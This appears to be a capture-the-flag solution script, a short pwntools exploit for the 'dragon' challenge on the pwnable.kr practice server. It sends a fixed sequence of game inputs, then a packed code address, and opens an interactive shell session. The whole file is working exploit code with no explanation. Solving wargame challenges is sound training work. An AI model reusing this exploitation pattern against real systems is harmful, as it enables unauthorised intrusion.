#!/usr/bin/python
#!coding=utf-8

"""
Description: dragon exploit
Author: xx
"""

import pwn

io = pwn.remote("pwnable.kr", 9004)

cmd_seq = "1111332332332332"
for c in cmd_seq:
	io.sendline(c)

addr = 0x08048DBF
io.sendline(pwn.p32(addr))
io.interactive()
